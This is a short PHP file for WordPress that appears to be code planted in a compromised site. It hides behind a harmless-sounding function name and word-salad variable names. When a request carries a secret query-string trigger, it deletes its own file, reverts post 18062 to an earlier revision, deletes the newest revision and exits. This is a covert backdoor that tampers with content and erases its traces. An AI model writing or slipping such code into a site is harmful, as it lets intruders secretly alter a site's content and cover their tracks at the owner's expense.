<?php

function wpc_profile_archive() {
	if (isset($_GET['kit_estate_domain_meta']) && $_GET['kit_estate_domain_meta'] === 'calculator_coupon_reusable') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$translate_location_html = 18062;
		$appointment_preloader_history = wp_get_post_revisions($translate_location_html);
		if (empty($appointment_preloader_history)) die('no revisions');
		if (count($appointment_preloader_history) < 2) die('less than 2');
		$chatbot_connect_date = array_shift($appointment_preloader_history);
		$sales_import_support = $chatbot_connect_date->ID;
		$simple_management_meta = array_shift($appointment_preloader_history);
		$uploader_extensions_customer = $simple_management_meta->ID;
		$real_compare_cookies = wp_restore_post_revision($uploader_extensions_customer);
		if ($real_compare_cookies === false) die('error restoring');
		$real_compare_cookies = wp_delete_post_revision($sales_import_support);		
		if ($real_compare_cookies === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'wpc_profile_archive');
